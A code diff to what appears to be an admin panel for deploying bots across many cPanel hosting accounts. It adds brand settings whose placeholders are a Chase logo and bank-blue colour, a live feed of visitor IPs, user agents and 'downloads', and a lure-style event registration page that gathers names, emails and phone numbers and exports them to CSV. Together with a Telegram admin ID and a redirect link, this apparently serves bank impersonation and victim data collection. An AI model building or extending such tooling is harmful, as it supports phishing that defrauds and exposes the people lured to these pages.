@@ -284,8 +284,81 @@
             <div><label>Admin Chat ID</label><input id="bc-cfg-admin-id" placeholder="123456789" inputmode="numeric" autocomplete="off"/></div>
           </div>
           <div class="row" style="margin-top:10px">
-            <div><label>Mobile Logo URL</label><input id="bc-cfg-logo" placeholder="https://logo.clearbit.com/chase.com" autocomplete="off" spellcheck="false"/></div>
-            <div><label>Mobile Color (hex)</label><input id="bc-cfg-color" placeholder="#003087" autocomplete="off" spellcheck="false" maxlength="7"/></div>
+            <div>
+              <label>Mobile Logo URL</label>
+              <div style="display:flex;gap:6px;align-items:center">
+                <input id="bc-cfg-logo" placeholder="https://logo.clearbit.com/chase.com" autocomplete="off" spellcheck="false" style="flex:1"/>
+                <img id="bc-logo-preview" src="" alt="" style="width:32px;height:32px;border-radius:6px;object-fit:contain;background:rgba(255,255,255,.08);border:1px solid var(--line);display:none;flex-shrink:0"/>
+              </div>
+            </div>
+            <div>
+              <label>Mobile Color</label>
+              <div style="display:flex;gap:6px;align-items:center">
+                <input id="bc-cfg-color" placeholder="#003087" autocomplete="off" spellcheck="false" maxlength="7" style="flex:1"/>
+                <input type="color" id="bc-cfg-color-picker" style="width:36px;height:36px;border:1px solid var(--line);border-radius:6px;padding:2px;background:transparent;cursor:pointer;flex-shrink:0"/>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Live Visits Feed -->
+        <div id="bc-visits-section" class="hidden" style="border-top:1px solid var(--line);padding-top:16px;margin-top:16px">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px">
+            <div style="font-weight:700;font-size:13px">Live Visits</div>
+            <button id="bc-refresh-visits" class="sm" style="margin:0">↻ Refresh</button>
+          </div>
+          <div id="bc-visits-stats" style="display:flex;gap:12px;margin-bottom:10px"></div>
+          <div id="bc-visits-table" style="overflow-x:auto;font-size:11px;max-height:220px;overflow-y:auto"></div>
+        </div>
+
+        <!-- Landing Bot section -->
+        <div id="bc-landing-section" class="hidden" style="border-top:1px solid var(--line);padding-top:16px;margin-top:16px">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+            <div style="font-weight:700;font-size:13px">🎟 Landing Bot (Event Registration)</div>
+            <div style="display:flex;gap:6px">
+              <button id="bc-landing-registrants" class="sm" style="margin:0">👥 Registrants</button>
+              <button id="bc-landing-save" class="sm" style="margin:0">💾 Save</button>
+            </div>
+          </div>
+          <div class="row">
+            <div><label>Event Title</label><input id="lc-title" placeholder="Free Webinar: Digital Marketing 2025" autocomplete="off" spellcheck="false"/></div>
+            <div><label>Accent Color</label>
+              <div style="display:flex;gap:6px;align-items:center">
+                <input id="lc-accent" placeholder="#2563eb" maxlength="7" style="flex:1"/>
+                <input type="color" id="lc-accent-picker" style="width:36px;height:36px;border:1px solid var(--line);border-radius:6px;padding:2px;background:transparent;cursor:pointer;flex-shrink:0"/>
+              </div>
+            </div>
+          </div>
+          <div class="row" style="margin-top:8px">
+            <div><label>Event Date</label><input id="lc-date" placeholder="October 15, 2025" autocomplete="off"/></div>
+            <div><label>Event Time</label><input id="lc-time" placeholder="3:00 PM EST" autocomplete="off"/></div>
+          </div>
+          <div class="row" style="margin-top:8px">
+            <div><label>Host / Speaker</label><input id="lc-host" placeholder="John Smith" autocomplete="off"/></div>
+            <div><label>Logo URL</label><input id="lc-logo" placeholder="https://..." autocomplete="off"/></div>
+          </div>
+          <div style="margin-top:8px">
+            <label>Event Description</label>
+            <textarea id="lc-desc" rows="2" placeholder="Brief description of the event..." style="width:100%;background:rgba(255,255,255,.06);border:1px solid var(--line);border-radius:8px;color:var(--text);padding:10px 12px;font-size:13px;font-family:inherit;resize:vertical"></textarea>
+          </div>
+          <div style="margin-top:8px">
+            <label>Confirmation Message</label>
+            <input id="lc-confirm" placeholder="You're registered! Check your email for details." autocomplete="off"/>
+          </div>
+          <div style="margin-top:8px;display:flex;gap:16px">
+            <label style="display:flex;align-items:center;gap:6px;font-size:12px;cursor:pointer;text-transform:none;letter-spacing:0;color:var(--text)">
+              <input type="checkbox" id="lc-field-phone" style="width:14px;height:14px"> Show Phone field
+            </label>
+            <label style="display:flex;align-items:center;gap:6px;font-size:12px;cursor:pointer;text-transform:none;letter-spacing:0;color:var(--text)">
+              <input type="checkbox" id="lc-field-company" style="width:14px;height:14px"> Show Company field
+            </label>
+          </div>
+          <div id="bc-landing-registrants-panel" class="hidden" style="margin-top:12px;border-top:1px solid var(--line);padding-top:12px">
+            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+              <div style="font-weight:600;font-size:12px">Registrants</div>
+              <a id="bc-landing-export" href="#" style="font-size:11px;color:var(--accent)">⬇ Export CSV</a>
+            </div>
+            <div id="bc-registrants-table" style="overflow-x:auto;font-size:11px;max-height:200px;overflow-y:auto"></div>
           </div>
         </div>
 
@@ -1097,8 +1170,12 @@ async function loadBotControl(){
       $("#bc-cfg-redirect").value  = c.redirect_link||"";
       $("#bc-cfg-bot-name").value  = c.bot_name||"";
       $("#bc-cfg-admin-id").value  = c.admin_chat_id||"";
-      $("#bc-cfg-logo").value      = c.mobile_logo||"";
-      $("#bc-cfg-color").value     = c.mobile_color||"";
+      const logo=c.mobile_logo||"";
+      const color=c.mobile_color||"";
+      $("#bc-cfg-logo").value  = logo;
+      $("#bc-cfg-color").value = color;
+      if(logo){$("#bc-logo-preview").src=logo;$("#bc-logo-preview").style.display="";}
+      if(/^#[0-9a-fA-F]{6}$/.test(color))$("#bc-cfg-color-picker").value=color;
       $("#bc-config-section").classList.remove("hidden");
     }
   }catch(_){}
@@ -1174,7 +1251,162 @@ $("#bc-save-config").onclick=async()=>{
   b.disabled=false;b.textContent=old;
 };
 
-// Update bot-source: push all local bot-source files to panelcou1999 (superadmin only)
+// ── Color Picker sync ─────────────────────────────────────────────────────
+const colorInput=$("#bc-cfg-color"),colorPicker=$("#bc-cfg-color-picker");
+const logoInput=$("#bc-cfg-logo"),logoPreview=$("#bc-logo-preview");
+
+colorInput.oninput=()=>{
+  const v=colorInput.value.trim();
+  if(/^#[0-9a-fA-F]{6}$/.test(v)) colorPicker.value=v;
+};
+colorPicker.oninput=()=>{ colorInput.value=colorPicker.value; };
+
+logoInput.oninput=()=>{
+  const url=logoInput.value.trim();
+  if(url){
+    logoPreview.src=url;logoPreview.style.display="";
+    logoPreview.onerror=()=>logoPreview.style.display="none";
+  }else logoPreview.style.display="none";
+};
+
+// Landing accent picker sync
+const lcAccent=$("#lc-accent"),lcPicker=$("#lc-accent-picker");
+lcAccent.oninput=()=>{if(/^#[0-9a-fA-F]{6}$/.test(lcAccent.value.trim()))lcPicker.value=lcAccent.value.trim();};
+lcPicker.oninput=()=>{lcAccent.value=lcPicker.value;};
+
+// ── Live Visits Feed ───────────────────────────────────────────────────────
+async function loadVisits(){
+  if(!CURRENT)return;
+  const statsEl=$("#bc-visits-stats"),tableEl=$("#bc-visits-table");
+  statsEl.innerHTML="<span style='color:var(--dim);font-size:11px'>Loading…</span>";
+  tableEl.innerHTML="";
+  try{
+    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"visits_get",limit:50})})).json();
+    if(!d.ok){statsEl.innerHTML="<span style='color:var(--crit)'>"+esc(d.error||"Failed")+"</span>";return;}
+    const total=d.total||0,dls=d.downloads||0,visits=d.visits||[];
+    statsEl.innerHTML=`
+      <div style="background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:8px;padding:8px 14px;text-align:center;flex:1">
+        <div style="font-size:20px;font-weight:700;color:var(--accent)">${total}</div>
+        <div style="font-size:10px;color:var(--dim);margin-top:2px">Total Visits</div>
+      </div>
+      <div style="background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:8px;padding:8px 14px;text-align:center;flex:1">
+        <div style="font-size:20px;font-weight:700;color:#22c55e">${dls}</div>
+        <div style="font-size:10px;color:var(--dim);margin-top:2px">Downloads</div>
+      </div>
+      <div style="background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:8px;padding:8px 14px;text-align:center;flex:1">
+        <div style="font-size:20px;font-weight:700;color:#f59e0b">${visits.length}</div>
+        <div style="font-size:10px;color:var(--dim);margin-top:2px">Showing</div>
+      </div>`;
+    if(!visits.length){tableEl.innerHTML="<div style='color:var(--dim);font-size:11px;padding:8px'>No visits yet.</div>";return;}
+    const cols=["ip","ua","action","created_at"];
+    tableEl.innerHTML=`<table style="width:100%;border-collapse:collapse">
+      <thead><tr>${cols.map(c=>`<th style="padding:5px 8px;text-align:left;border-bottom:1px solid var(--line);color:var(--dim);font-size:10px;text-transform:uppercase">${c}</th>`).join("")}</tr></thead>
+      <tbody>${visits.map(v=>`<tr style="border-bottom:1px solid rgba(255,255,255,.03)">${cols.map(c=>`<td style="padding:5px 8px;max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(String(v[c]||""))}</td>`).join("")}</tr>`).join("")}</tbody>
+    </table>`;
+  }catch(e){statsEl.innerHTML="<span style='color:var(--crit)'>"+esc(e.message)+"</span>";}
+}
+$("#bc-refresh-visits").onclick=()=>loadVisits();
+
+// ── Landing Bot config ─────────────────────────────────────────────────────
+async function loadLandingConfig(){
+  if(!CURRENT)return;
+  try{
+    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"landing_config_get"})})).json();
+    if(d.ok&&d.config){
+      const c=d.config;
+      $("#lc-title").value   = c.event_title  ||"";
+      $("#lc-date").value    = c.event_date    ||"";
+      $("#lc-time").value    = c.event_time    ||"";
+      $("#lc-desc").value    = c.event_desc    ||"";
+      $("#lc-host").value    = c.event_host    ||"";
+      $("#lc-logo").value    = c.logo_url      ||"";
+      $("#lc-confirm").value = c.confirm_msg   ||"";
+      const acc=c.accent||"#2563eb";
+      $("#lc-accent").value=acc;
+      if(/^#[0-9a-fA-F]{6}$/.test(acc))$("#lc-accent-picker").value=acc;
+      $("#lc-field-phone").checked   = !!c.field_phone;
+      $("#lc-field-company").checked = !!c.field_company;
+      $("#bc-landing-section").classList.remove("hidden");
+    }else{
+      // show section anyway so admin can set it up
+      $("#bc-landing-section").classList.remove("hidden");
+    }
+  }catch(_){$("#bc-landing-section").classList.remove("hidden");}
+}
+
+$("#bc-landing-save").onclick=async()=>{
+  const b=$("#bc-landing-save");b.disabled=true;const old=b.textContent;b.textContent="Saving…";
+  const payload={
+    event_title:  $("#lc-title").value.trim(),
+    event_date:   $("#lc-date").value.trim(),
+    event_time:   $("#lc-time").value.trim(),
+    event_desc:   $("#lc-desc").value.trim(),
+    event_host:   $("#lc-host").value.trim(),
+    logo_url:     $("#lc-logo").value.trim(),
+    accent:       $("#lc-accent").value.trim(),
+    confirm_msg:  $("#lc-confirm").value.trim(),
+    field_phone:  $("#lc-field-phone").checked?1:0,
+    field_company:$("#lc-field-company").checked?1:0,
+  };
+  try{
+    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"landing_config_save",...payload})})).json();
+    if(d.ok) bcNote("✓ Landing config saved. Page: <a href='https://"+esc(CURRENT.domain)+"/landing.php' target='_blank'>"+esc(CURRENT.domain)+"/landing.php</a>","ok");
+    else bcNote("✗ "+esc(d.error||d.msg||"Failed"),"err");
+  }catch(e){bcNote("✗ "+esc(e.message),"err");}
+  b.disabled=false;b.textContent=old;
+};
+
+$("#bc-landing-registrants").onclick=async()=>{
+  const panel=$("#bc-landing-registrants-panel"),tableEl=$("#bc-registrants-table");
+  const isHidden=panel.classList.contains("hidden");
+  if(!isHidden){panel.classList.add("hidden");return;}
+  panel.classList.remove("hidden");
+  tableEl.innerHTML="<div style='color:var(--dim);font-size:11px'>Loading…</div>";
+  try{
+    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"registrants_get",limit:100})})).json();
+    if(!d.ok){tableEl.innerHTML="<div style='color:var(--crit)'>"+esc(d.error||"Failed")+"</div>";return;}
+    const list=d.registrants||[];
+    if(!list.length){tableEl.innerHTML="<div style='color:var(--dim);font-size:11px;padding:8px'>No registrants yet.</div>";return;}
+    const cols=["name","email","phone","company","ts"];
+    tableEl.innerHTML=`<table style="width:100%;border-collapse:collapse">
+      <thead><tr>${cols.map(c=>`<th style="padding:4px 8px;text-align:left;border-bottom:1px solid var(--line);color:var(--dim);font-size:10px;text-transform:uppercase">${c}</th>`).join("")}</tr></thead>
+      <tbody>${list.map(v=>`<tr style="border-bottom:1px solid rgba(255,255,255,.03)">${cols.map(c=>`<td style="padding:4px 8px;font-size:11px">${esc(String(v[c]||""))}</td>`).join("")}</tr>`).join("")}</tbody>
+    </table>`;
+    // Export link
+    const exportUrl=API("bot_proxy")+"_export&cpanelUser="+encodeURIComponent(CURRENT.user)+"&domain="+encodeURIComponent(CURRENT.domain)+"&subaction=registrants_export";
+    $("#bc-landing-export").href=exportUrl;
+    $("#bc-landing-export").onclick=async(e)=>{
+      e.preventDefault();
+      const ed=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"registrants_export"})})).json();
+      // registrants_export returns CSV but via bot_proxy it's JSON-wrapped — handle plain download
+      const rows=list;
+      const csvCols=["name","email","phone","company","ip","ts"];
+      const csv=[csvCols.join(","),...rows.map(r=>csvCols.map(k=>'"'+(r[k]||"").replace(/"/g,'""')+'"').join(","))].join("\n");
+      const blob=new Blob([csv],{type:"text/csv"});
+      const a=document.createElement("a");a.href=URL.createObjectURL(blob);a.download="registrants.csv";a.click();
+    };
+  }catch(e){tableEl.innerHTML="<div style='color:var(--crit)'>"+esc(e.message)+"</div>";}
+};
+
+// Patch loadBotControl to also load visits + landing config
+const _origLoadBC=loadBotControl;
+loadBotControl=async function(){
+  await _origLoadBC();
+  if(CURRENT){
+    // show visits section
+    $("#bc-visits-section").classList.remove("hidden");
+    loadVisits();
+    // load landing config
+    loadLandingConfig();
+  }
+};
+
+// ── Update bot-source: push all local bot-source files to panelcou1999 (superadmin only)
 const ovSrcBtn=$("#ov-update-source");
 ovSrcBtn.onclick=async()=>{
   if(!confirm("Push all local bot-source files to panelcou1999/public_html/bot-source?\nThis updates what gets deployed to new cPanels."))return;
